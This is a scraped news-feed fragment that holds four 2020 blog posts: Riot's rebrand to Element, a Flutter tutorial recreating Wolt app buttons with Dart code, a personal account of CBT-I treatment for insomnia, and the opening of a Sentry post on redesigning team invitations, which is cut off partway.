<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi everyone,</p><p>We are incredibly excited to announce that <strong>Riot is now Element</strong>! </p><p>In fact we have simplified all our naming: Element is also the name for New Vector (the company behind Riot) while Modular, our flagship Matrix hosting service, has become Element Matrix Services.</p><p>For those discovering us for the first time: Element is the flagship secure collaboration app for the decentralised <a href="https://matrix.org/">Matrix</a> communication network. &nbsp;Element lets you own your own end-to-end encrypted chat server, while still connecting to everyone else in the wider Matrix network.</p><figure><img src="https://element.io/blog/content/images/2020/07/element-logo.png"></figure><p><br>What’s more, <strong>RiotX is now out of beta</strong> - our next generation Matrix client for Android has flown the nest and spread its wings as Element - replacing the old Riot Android app at last!</p><p>This name change has been a long time in the making. As we explained when we announced the rebrand <a href="https://blog.riot.im/the-world-is-changing/">a few weeks ago</a>, we’ve had major issues with a certain gigantic games company which has blocked us from being able to trademark Riot or even Riot.im - a huge issue when it comes to defending users against abusive forks of the app. Secondly, people incorrectly assume Riot refers to violence, rather than the more constructive forms of chaos we had in mind. Lastly, it made sense in the early days of Matrix to have different brands to illustrate the different roles of Riot, Modular and New Vector in the ecosystem… but nowadays there are loads of Matrix clients, Matrix hosting providers and companies building on Matrix - and so all New Vector’s different names were just causing confusion. &nbsp;</p><h3 id="so-why-element">So, why Element?</h3><p>We want a name that reflects the emphasis on simplicity and clarity that we aimed for when designing RiotX; a name that highlights our single-minded mission to make Element the most elegant and usable mainstream comms app imaginable. &nbsp;Riot had a pretty chequered history, spending much of its life in beta, with intermittent attention to design until we hit 1.0 last year - but nowadays we have a dedicated full-time design team working on Element, who not only design the graphics but the overall behaviour of new features in the app. &nbsp;This is not an easy task, given it turns out the hardest bits of end-to-end encryption are almost entirely UX challenges. &nbsp;What’s more, presenting a global decentralised communication network as simply as a centralised communication island is surprisingly tricky. &nbsp;However: we have been making massive progress, to the extent that we are barely recognisable as the Riot of the past. Element reflects a clean start to focus monomaniacally on mainstream usability in future.</p><p>We also want a name that better evokes the idea of data ownership and self-sovereignty. &nbsp;An element is the smallest indivisible thing in a system - yet one which can stand alone. &nbsp;You can customise it, control it and make it your own - you can literally be in your Element!</p><p>Moreover, we want a name that will be future-proof for peer-to-peer Matrix. &nbsp;As Matrix.org announced last month, <a href="https://matrix.org/blog/2020/06/02/introducing-p-2-p-matrix">P2P Matrix is in heavy development</a> - and we can see a world where Element will literally be an element of Matrix, running your own homeserver within the app, so you can communicate if you don’t have a server… or even Internet. In fact, we published the first experimental build of <a href="https://matrix.org/blog/2020/07/10/this-week-in-matrix-2020-07-10#riot-ios-p2p-demo">P2P Riot for iOS</a> on Testflight a few days ago - so we can clearly see a future where we will be in our P2P element!</p><p>Finally, we think it’s a cool name :D &nbsp;It fits in nicely with the term Matrix while not being as nerdy as Vector. &nbsp;We’re obviously aware that Element is (once again) both a dictionary word and a mathematical term - but in practice, looking at search results for Element right now, the top hits are for dictionary sites(!) and the field is wide open. &nbsp;Conversely, in a virgin browser on VPN, Riot is the 4th hit on Google for Riot; second only to a certain games company. &nbsp;In other words, we’ve shown that we can successfully adopt dictionary words - and if you do find yourself lost searching in a maze of mathematics, just throw in the word ‘chat’ to get back on track. &nbsp;(For all the linear algebraists who are spitting with rage at this point: we promise we’ll make it up to you by finally sorting out <a href="https://github.com/matrix-org/matrix-react-sdk/pull/3251">latex support</a> in Element!)</p><p>This change is inevitably going to be disruptive, and we’re painfully aware that we’ve spent four years building up Riot’s reputation and persuading everyone to move their friends, families and teams onto it. &nbsp;To reiterate what we said when we announced the change, we know that many people reading this will have put their necks on the line to get folks to adopt Riot, and we really appreciate how frustrating it may be to have to explain the change to your users. &nbsp;However, this is unquestionably the right time to shed our skin and make the change, and we hope folks will grow to love Element much more than they ever did Riot. &nbsp;To aid the transition, we’ve named the installable apps “Element (Riot.im)” for a while to help people get reoriented (e.g. when searching by name for Riot).</p><p>Last but not least: Element isn’t just a new name - it comes with a massive suite of improvements across Android, iOS and Web.</p><p>We’ll write about these in full over the coming days, but the big headlines are that RiotX (our ground-up rewrite of Riot Android) has exited beta, and replaces Riot Android as Element - complete with VoIP calls and Widget support! Riot Android users will magically autoupgrade into Element; the old RiotX app will be retired in due course. FDroid is likely releasing Element as an entirely new app. &nbsp;Meanwhile On iOS we now have full support for iOS 13, complete with entirely new push notification support (thanks to Apple’s nightmarish <a href="https://appleinsider.com/articles/19/09/05/secure-messaging-apps-working-to-comply-with-apples-ios-13-privacy-changes">deprecation of PushKit</a>).</p><figure><img src="https://element.io/blog/content/images/2020/07/RiotX-1.png"><figcaption>The App Formerly Known As RiotX!</figcaption></figure><p>On Element Web, we’ve given the UI a massive refresh, with a beautiful new font (<a href="https://rsms.me/inter/">Inter</a>) giving much improved legibility, and we’ve <strong>completely</strong> rewritten the Room List control - adding in room previews(!!), alphabetic ordering, resizable lists, improved notification UI and more. We’ve also landed the first phase of further improving the end-to-end encryption setup process - letting users generate a recovery key rather than forcing them to select a recovery passphrase when setting up E2EE for the first time (the next phase is to delay setting up E2EE until the user actually starts talking in encrypted rooms).</p><figure><img src="https://element.io/blog/content/images/2020/07/Screenshot-2020-07-15-at-00.54.45.png"></figure><p>So there you have it. Welcome to a whole new beginning for Riot: welcome to your new Element, one where mainstream Matrix users will enjoy themselves too - and which will pave the way for wider adoption of open, secure, decentralised communication via Matrix throughout the world.</p><p>- Matthew, Amandine, and the whole Element team.</p><p>P.S. Check out our <a href="https://element.io/">all-new website</a> and in particular the <a href="https://element.io/previously-riot">migration page</a> for much more information about our brave new world!<br></p></div></div>]]>
            </description>
            <link>https://element.io/blog/welcome-to-element/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23842154</guid>
            <pubDate>Wed, 15 Jul 2020 07:01:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Create a sleek UI in Flutter – Wolt app case study]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23842062">thread link</a>) | @czajuuu
<br/>
July 14, 2020 | https://www.nomtek.com/blog/sleek-ui-in-flutter-wolt | <a href="https://web.archive.org/web/*/https://www.nomtek.com/blog/sleek-ui-in-flutter-wolt">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Flutter is Google’s UI toolkit for building beautiful, natively compiled applications for mobile, web, and desktop from a single codebase</em>. We are going to check its promises by recreating part of an existing application as accurately as possible. I chose the Wolt app because the Wolt team has been doing an amazing job, creating sleek UI &amp; UX with many subtle details.</p><figure id="w-node-ef7dc46c635c-c5de3bde"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/UI9vN8Y583o"></iframe></p></figure><p>‍<br></p><p>My goal for this series is to present a thought process that leads to the desired result rather than provide a copy-paste solution. We will work in a build-refactor cycle, examining potential problems and framework limitations. You may find the whole code for this series on our github: <a href="https://github.com/nomtek/flutter-meets-wolt">https://github.com/nomtek/flutter-meets-wolt</a>.<br>Let’s dive in!<br></p><h2>App bar buttons &amp; menu</h2><p>Let’s warm up with something that seems to be simple - app bar buttons. There are two of them - one is used to navigate back, and the other is showing a menu with two items. My first idea was to use <em>IconButton</em> composed with <em>Container</em> that has circle-shaped decoration:</p><div>
<pre>class AppBarButton extends StatelessWidget {
  final IconData icon;
  final VoidCallback onPressed;
     
     const AppBarButton({Key key, this.icon, this.onPressed}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(shape: BoxShape.circle, color: Colors.grey[300]),
      child: IconButton(
        icon: Icon(icon),
        onPressed: onPressed,
      ),
    );
  }
}
     </pre>
</div><p>When we put those widgets in an AppBar:</p><div>
<pre>SliverAppBar(
  leading: AppBarButton(
    icon: Icons.keyboard_backspace,
    onPressed: () =&gt; Navigator.pop(context),
  ),
  actions: [
    AppBarButton(
      icon: Icons.more_horiz,
      onPressed: () { /* TODO */ },
    ),
  ],
  </pre>
  </div><p>The result is already quite similar to what we have in the original application:<br></p><figure><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eeca98badfe870ce2c0e65a_Hnet.com-image.gif" alt=""></p></figure><p>Our first implementation has no padding and buttons are too big. When we press the button it shows a grey highlight followed by an animated, darker splash instead of opacity change. Let’s try to implement those missing features.</p><h2>Size and layout</h2><p>On the iPhone 8, original buttons have a size of 40x40 points, 16 points margin to the screen edge and 8 points bottom offset. Given that app bar has a height of 44 points on this iPhone it would mean that those buttons have to overlay status bar (the one with signal strength, clock and battery status) and indeed they are:<br></p><figure id="w-node-53719c61cb64-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eeca9d84b65ff38701fee0a_overlay.png" alt="flutter_overlay"></p></figure><p>We can apply those constraints by wrapping our button widgets in <em>Padding</em> and <em>Align</em>.</p><div>
<pre>    return Padding(
      padding: EdgeInsets.fromLTRB(
        position == AppBarPosition.leading ? 16 : 0, 0,
        position == AppBarPosition.trailing ? 16 : 0, 8),
      child: Align(
        alignment: Alignment.topCenter,
        child: Container(
          width: 40,
          height: 40,
(...)

  </pre>
  </div><figure id="w-node-11a065b0312c-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa077f68da65b8562c7c_56px_app_bar.png" alt="flutter_app_bar"></p></figure><p>One difference is that the bottom offset is bigger in our implementation and we don’t even overflow status bar. The reason is that the height of our app bar is calculated based on the <em>const double kToolbarHeight = 56.0; </em>constant from the Flutter framework. There is no explicit way to set app bar height, eg. by constructor parameter, and the class responsible for the app bar layout, which uses this constant, is private (<em>_SliverAppBarDelegate</em>). This prevents us from using inheritance to override the code responsible for height computation. This delegate is, again, not exposed by the app bar (<em>SliverAppBar</em>), so even if we end up creating our own version, we won’t be able to use it unless we also extend <em>SliverAppBar</em> and override<em> build</em> method from its state. Since Flutter is open source this could be done in a few minutes, by copy-paste original implementation and tweaking those details, but it’s far from feasible solution as we would have to maintain our version and keep it in sync with improvements made by the Flutter team to the original classes.<br></p><p>It’s worth to take a note, that<em> kToolbarHeight</em> is also used to constraint the width of the leading widget (back button in our case), forcing it to be a square. This is how our app bar looks like with margins increased to 25 points. Notice shrunken leading button, while trailing is spaced from the screen edge as expected. This limitation has no effect in our case, as designed margin and button size is exactly matching available space.<br></p><figure id="w-node-0b501ed6363f-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa3d49a49185d4d77cdd_25px_margin.png" alt="flutter_margin"></p></figure><h2>Highlight behaviour<br></h2><p>In the Wolt app when the button is highlighted it changes the opacity of the icon. There is no highlight colour change or splash animation. We can re-create such behaviour by wrapping button in the <em>Opacity</em> widget. To track highlight status we have to introduce an internal state, represented by the <em>_isHighlighted</em> boolean property. That means we have to refactor our widget from stateless to stateful:</p><div>
<pre>enum AppBarPosition {
  leading,
  trailing,
}

class AppBarButton extends StatefulWidget {
  final IconData icon;
  final VoidCallback onPressed;
  final AppBarPosition position;

  const AppBarButton({Key key, this.icon, this.onPressed, this.position}) : super(key: key);

  @override
  _AppBarButtonState createState() =&gt; _AppBarButtonState();
}

class _AppBarButtonState extends State<appbarbutton> {

  bool _isHighlighted = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.fromLTRB(widget.position == AppBarPosition.leading ? 16 : 0, 0,
          widget.position == AppBarPosition.trailing ? 16 : 0, 8),
      child: Align(
        alignment: Alignment.topCenter,
        child: Container(
          width: 40,
          height: 40,
          decoration: BoxDecoration(shape: BoxShape.circle, color: Colors.grey[300]),
          child: Opacity(
            opacity: _isHighlighted ? 0.3 : 1.0,
            child: IconButton(
              icon: Icon(
                widget.icon,
                color: Colors.black,
              ),
              onPressed: widget.onPressed,
            ),
          ),
        ),
      ),
    );
  }
}
  </appbarbutton></pre>
  </div><p>Unfortunately, <em>IconButton</em> we are using is not exposing <em>onHighlightChanged</em> callback - only <em>onPressed</em>, which is not enough for our needs. We have to refactor our code to use more generic button class, like<em> RawMaterialButton</em> where we have more control over callbacks and visual settings.</p><div>
<pre>  child: RawMaterialButton(
    highlightColor: Colors.transparent,
    splashColor: Colors.transparent,
    onHighlightChanged: (isHighlighted) =&gt; setState(() {
      _isHighlighted = isHighlighted;
    }),
    child: Icon(
      widget.icon,
      color: Colors.black,
    ),
    onPressed: widget.onPressed,
  ),
</pre>
</div><h2>Showing the menu<br></h2><p>When the user presses menu button two things happen - the menu is shown and the button icon changes from three dots to close cross. We are going to track the current state in the boolean property <em>_isMenuShown </em>in the State of the screen-route. Updated menu button:</p><div>
<pre>    AppBarButton(
      icon: _isMenuShown ? Icons.close : Icons.more_horiz,
      position: AppBarPosition.trailing,
      onPressed: () {
        Navigator.push(context, AppBarMenu())
            .then((_) =&gt; setState(() =&gt; _isMenuShown = false));
        setState(() =&gt; _isMenuShown = true);
      },
    ),
</pre>
</div><p>We will build <em>AppBarMenu</em> class that extends <em>PopupRoute</em>, as it gives us more control over UI of the menu than <em>PopupMenuButton</em> from the Flutter framework. On button press, Navigator widget is tasked to push our Route to the stack. Push method returns a future which completes after this route is dismissed - that’s why we set <em>_isMenuShown</em> to false in the <em>then </em>callback.</p><h2>Menu look &amp; feel<br></h2><p>Our final task is to build a menu that will be displayed. It’s pretty straightforward - a list with two items, the less obvious parts maybe how to place it on the screen, and how to achieve the shape of a rectangle with rounded corners and triangle indicator on top. We are going to use <em>ClipPath</em> widget with a custom clipper to build the desired shape. An alternative solution would be to compose <em>ClipRRect</em> (RRect stands for rounded rectangle) with an <em>Image</em> widget for the top triangle. Yet another idea is to have a whole background as a nine-patch image, and there are for sure a few more feasible options to achieve the desired UI. Due to Flutter’s widget-oriented architecture, there are often multiple ways how can we compose existing primitives into more complex structures - like this fancy-shaped menu. You can preview updated buttons and the menu on the gif below:<br></p><figure id="w-node-2d5de7a9800c-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa9a37ac27758ef39129_Hnet.com-image%20(1).gif" alt="flutter_buttons_menu"></p></figure><h2>Conclusion<br></h2><p>Flutter allowed us to recreate, very closely, UI and UX of Wolt’s piece of the interface. We were able to achieve the compelling look &amp; feel quickly by composing native widgets, and even if there are certain limitations, due to open-source nature of the Flutter framework, achieving pixel-perfect quality is possible when needed.<br></p></div></div>]]>
            </description>
            <link>https://www.nomtek.com/blog/sleek-ui-in-flutter-wolt</link>
            <guid isPermaLink="false">hacker-news-small-sites-23842062</guid>
            <pubDate>Wed, 15 Jul 2020 06:43:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Insomniac's journey to regular sleep]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23841175">thread link</a>) | @rahulshiv7
<br/>
July 14, 2020 | https://www.sleepedy.com/articles/insomniac-journey-to-better-sleep/ | <a href="https://web.archive.org/web/*/https://www.sleepedy.com/articles/insomniac-journey-to-better-sleep/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>I'd done everything right, yet it was 2 am and I still couldn't sleep. I had meditated for 30 minutes before I went to bed. I even took a couple of melatonin pills right after to be sure. Yet, here I was wide awake dreading how exhausted I would be the next day at work.</p><p>My problem wasn't unique. In America, one in every 10 adults will experience chronic insomnia<sup><a href="#references">1</a></sup>. It takes just one poor night of sleep to devolve into long term sleeping problems. This is because the majority of sleeping problems stem from anxiety and worry<sup><a href="#references">2</a></sup>. <b>The more you worry about not getting enough sleep, the worse your sleep gets</b>.</p><p>For me, my sleeping issues began right out of college. I had started a job as a software engineer and I was starting to feel the pressure. I had a couple of big deadlines coming up and I found myself tossing and turning unable to sleep one night. My mind kept racing, thinking about all the work I had until I finally fell asleep.</p><p>I thought that was it — an abnormal night, but then it happened again. This time, my outlook changed. I started worrying about how not getting enough sleep would affect my day. I looked up basic sleep hygiene tips online and decided to go to bed extra early to make sure I made up for lost sleep. This ended up backfiring and it took a few hours before I could finally sleep.</p><p>At this point, my sleeping struggles started becoming more regular. I downloaded a couple of meditation apps in the hopes that meditating and listening to soothing sounds would help me sleep better. I even resorted to over the counter sleeping aids on nights when it took me too long to fall asleep. <b>The results were mixed — I'd fall asleep faster but over time I'd revert back to having poor sleep</b>.</p><p>I finally caved and decided to try prescription medication. I had read a lot about them and was very reluctant because of their long term side effects. On a visit to my doctor, I asked her if she could prescribe me something to help me sleep. She said she said she could, but it wasn't going to be medication. Instead, she put in a referral to a CBT-I (Cognitive Behavioral Therapy for Insomnia) therapist.</p><p>CBT-I is an evidence-based (proven in clinical trials) technique used to treat sleep problems<sup><a href="#references">3</a></sup>. <b>Two driving forces induce sleep — sleep drive &amp; mental arousal</b>. Your sleep drive is how sleepy/tired you feel when going to bed. Your mental arousal is the racing thoughts and alertness you feel when you go to bed. When your sleep drive is high and your arousal levels are low; it is easier to fall asleep. CBT-I prescribes a sleep schedule that ensures you have a high sleep drive. It also teaches you techniques to worry less and reduce your arousal.</p><p><b>CBT-I is extremely effective in treating sleeping problems</b>. Clinical trials have shown that 80% of people that follow a good CBT-I program will have normal sleep by the end<sup><a href="#references">4</a></sup>. The results are also permanent, unlike sleeping aids which are effective only as long as you are taking them<sup><a href="#references">5</a></sup>.</p><p>There were three main rules that I had to follow -</p><ol><li><p>I could only sleep within the sleep window my therapist prescribed. This ensured that I only went to bed when my sleep drive was high.</p></li><li><p>Every time I couldn't sleep, I had to make sure I didn't stay in bed for over 20 minutes. This way, I would subconsciously re-train my mind to not associate my bed with wakefulness<sup><a href="#references">6</a></sup>.</p></li><li><p>No day time naps and no caffeine after 2pm.</p></li></ol><div><p>I was sleeping around 5 hours at the time, so we set a 6 hour window within which I could sleep (1am - 7am in my case). I kept a log of how long it took me to sleep, how long I was awake in the middle of the night and how long I slept. This data was recorded to the closest 15th minute and is self reported. At the end of each week, my therapist would alter my sleep schedule based on the previous week's data.<b> Note:</b> Time awake is the time it took me to fall asleep + my night time awakenings
</p></div><p>
At the end of week 1, I was sleeping about the same as I was before. My time awake at night though had fallen by an hour. I was falling asleep faster and I was having less interrupted sleep. We decided to stick to the same sleep schedule for week 2.
</p><p>
At the end of this week, my sleep had increased and I was consistently awake for less than an hour. We decided to expand my window by 15 minutes for week 3.
</p><p>
We followed the same rules and either expanded or kept the same sleeping window for the next few weeks.
</p><p><b>At the end of the 10 week program, I was sleeping over 7 hours a night</b>. More importantly, I wasn't spending my days worrying about my sleep.
</p><p><b>CBT-I isn't an easy solution</b>. The sleep schedules are hard to follow and the results aren't instantaneous. It takes time and effort but the reward of permanently improved sleep is well worth it. Let me know if you do decide to try it and if it helps you improve your sleep. Here's to hoping you get better sleep soon.</p><p>If you'd like to know more about CBTI and other behavioral therapy techniques to improve sleep, check out our <a href="https://www.sleepedy.com/" target="_blank" rel="nofollow noopener noreferrer">website</a>!</p><h2 id="references">References</h2><ol><li><p><a href="http://sleepeducation.org/news/2014/03/10/insomnia-awareness-day-facts-and-stats" target="_blank" rel="nofollow noopener noreferrer">Insomnia Awareness Day by the American Association of Sleep Medicine</a></p></li><li><p><a href="https://adaa.org/understanding-anxiety/related-illnesses/sleep-disorders" target="_blank" rel="nofollow noopener noreferrer">Sleep Disorders by the Anxiety and Depression Association of America</a></p></li><li><p><a href="https://www.sleepedy.com/cbt-for-insomnia" target="_blank" rel="nofollow noopener noreferrer">CBT for Insomnia: A comprehensive guide</a></p></li><li><p>Trauer, James M. et al. “<a href="https://www.ncbi.nlm.nih.gov/pubmed/26054060" target="_blank" rel="nofollow noopener noreferrer">Cognitive Behavioral Therapy for Chronic Insomnia: A Systematic Review and Meta-analysis.</a> Ann Intern Med. August 2015 163(3) : 191-204</p></li><li><p><a href="https://www.phillymag.com/be-well-philly/2016/04/29/otc-sleep-aids-sleeping-supplements/" target="_blank" rel="nofollow noopener noreferrer">Phily Mag interview with doctors on efficacy of sleep supplements</a></p></li><li><p><a href="https://stanfordhealthcare.org/medical-treatments/c/cognitive-behavioral-therapy-insomnia/procedures/stimulus-control.html" target="_blank" rel="nofollow noopener noreferrer">Stimulus Control: Stanford Healthcare</a></p></li></ol></div></div></div>]]>
            </description>
            <link>https://www.sleepedy.com/articles/insomniac-journey-to-better-sleep/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23841175</guid>
            <pubDate>Wed, 15 Jul 2020 03:59:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How we grew Sentry's monthly active users by rethinking invitations]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23841049">thread link</a>) | @bentlegen
<br/>
July 14, 2020 | https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations | <a href="https://web.archive.org/web/*/https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><time datetime="2020-02-12T00:00">February 12, 2020</time><div><p>At its core, Sentry is a tool that alerts you to defects in your production software. But it does more than blast stack traces into your inbox: Sentry provides powerful workflows to help your team determine root cause, <a href="https://blog.sentry.io/2019/02/07/sentry-workflow-triage">triage issues</a> to your team, and keep tabs on ongoing concerns with comments and notifications.</p>
<p>These collaborative features can help you resolve problems with your software quickly. But the keyword here is <strong>collaborative</strong>; without your full team having access to Sentry, you may find yourself quickly becoming overwhelmed with an endless backlog of issues and no one to help.</p>
<p>At the end of 2019, the Growth team made it our mission to make it easier for our users to invite their teammates to join them on Sentry. To achieve this, we tackled three distinct areas:</p>
<ol>
<li>Surfacing the ability to invite users contextually</li>
<li>Expanding Sentry’s permission model to allow <em>more types of users</em> to send invitations </li>
<li>Allowing external users to request access themselves</li>
</ol>
<p>Our theory: improving the user experience of inviting users, <em>as well as</em> democratizing the process to include all team members would lead to a significant increase in team-wide adoption. <em>(Narrator: it did.)</em></p>
<h2 id="the-status-quo"><a href="#the-status-quo" aria-label="the status quo permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>The status quo</h2>
<p>Before we get deep into what we changed and how it impacted the bottom line, let’s quickly revisit how user invitations worked: the <em>Add Member to Organization</em> page you see below.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=233 233w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=465 465w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=930 930w" sizes="(max-width: 800px) 100vw, 800px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=233 233w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=465 465w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=930 930w" sizes="(max-width: 800px) 100vw, 800px">
          <img alt="1-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>This full-page experience, tucked away deep in Sentry’s account settings, had a number of issues:</p>
<ol>
<li>Since this is a full page, reaching it meant you would be taken out of context of whatever you were doing previously</li>
<li>Its location deep in our navigation hierarchy meant discoverability was poor</li>
<li>It’s <em>unclear</em> you can actually invite multiple people at once (you can!)</li>
<li>When inviting multiple users, you could only assign the group to the same role and collection of teams</li>
</ol>
<p>Interestingly, to improve discoverability, we had previously introduced a number of “quick links” to reach this page more easily. But these links were scattered around the application, and didn’t appear contextually when users signaled intent to invite members.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/4xiHp1Gl0HaZ0l8USGDPLr/79402583357d98cf55ad2dfda6ffe537/2-invitations.png" alt="" title="2-invitations"></p></figure><div>
<p>These user experience and discovery challenges felt like obvious starting places. But instead of just settling for a new “improved” form, we decided to rethink the entire experience from the ground up.</p>
<h2 id="the-new-member-invitation-modal"><a href="#the-new-member-invitation-modal" aria-label="the new member invitation modal permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>The new member invitation modal</h2>
<p>It’s probably not a surprise that our first instinct was to convert this page into a modal –&nbsp;one that manages to squeeze all of the capabilities shown earlier into a smaller, more concise experience. It actually does one better: the modal is clearer in indicating that you can invite multiple users, and allows you to set unique permissions for each invitee.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=190 190w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=381 381w,
